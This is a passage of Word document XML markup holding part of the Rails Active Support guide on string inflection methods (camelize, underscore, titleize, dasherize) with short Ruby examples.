          <w:p w14:paraId="4F7B3037" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      store</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43F5856C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D0C591A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5CA0EC36" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>camelize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> accepts an optional argument, it can be </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:upper</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (default), or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:lower</w:t>
      </w:r>
      <w:r>
        <w:t>. With the latter the first letter becomes lowercase:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2D5C8D6A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2492C356" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="956109221"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"visual_effect".camelize(:lower) # =&gt; "visualEffect"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="52A9E6CF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>That may be handy to compute method names in a language that follows that convention, for example JavaScript.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B088217" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As a rule of thumb you can think of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>camelize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as the inverse of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>underscore</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, though there are cases where that does not hold: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>“SSLError”.underscore.camelize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gives back </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>“SslError”</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. To support cases such as this, Active Support allows you to specify acronyms in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/initializers/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5808"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="26CF5A08" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7073A5F6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActiveSupport::Inflector.inflections do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|inflect|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FB2C701" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  inflect.acronym 'SSL'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="288935ED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32E6804B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FD483C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"SSLError".underscore.camelize #=&gt; "SSLError"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7BBDB35A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>camelize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>camelcase</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37968AB8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2554749C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>underscore</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="340A4E41" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>underscore</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> goes the other way around, from camel case to paths:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="32807029" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A68D554" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Product".underscore   # =&gt; "product"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72CCB674" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"AdminUser".underscore # =&gt; "admin_user"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="045B9DA7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Also converts “::” back to “/”:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6960"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="455F3B69" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="49BBD174" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1261448823"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Backoffice::Session".underscore # =&gt; "backoffice/session"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7177170A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>and understands strings that start with lowercase:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3F433275" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="00BBCA0E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="551623595"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"visualEffect".underscore # =&gt; "visual_effect"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0FF39544" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>underscore</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> accepts no argument though.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EB1F9B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails class and module autoloading uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>underscore</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to infer the relative path without extension of a file that would define a given missing constant:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7200"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2FD77F4A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5CC5BB2B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># active_support/dependencies.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28AA4AB9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>load_missing_constant(from_mod, const_name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2801567A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="565F53CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  qualified_name = qualified_name_for from_mod, const_name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="221E8BE8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  path_suffix = qualified_name.underscore</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08EA121C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16C572F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="793AF765" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As a rule of thumb you can think of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>underscore</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as the inverse of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>camelize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, though there are cases where that does not hold. For example, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>“SSLError”.underscore.camelize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> gives back </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>“SslError”</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6631E2C3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D54376" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>titleize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A89B991" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>titleize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> capitalizes the words in the receiver:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6840"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="71178AED" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40A0D641" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"alice in wonderland".titleize # =&gt; "Alice In Wonderland"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="754848A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"fermat's enigma".titleize     # =&gt; "Fermat's Enigma"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2F398DBA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>titleize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>titlecase</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFED423" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441D2C10" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.9.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>dasherize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E304A7D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>dasherize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> replaces the underscores in the receiver with dashes:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7763E602" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0DA66DBD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"name".dasherize         # =&gt; "name"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44CC9459" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"contact_data".dasherize # =&gt; "contact-data"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4E7BC619" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> serializer of models uses this method to dasherize node names:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7D506187" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
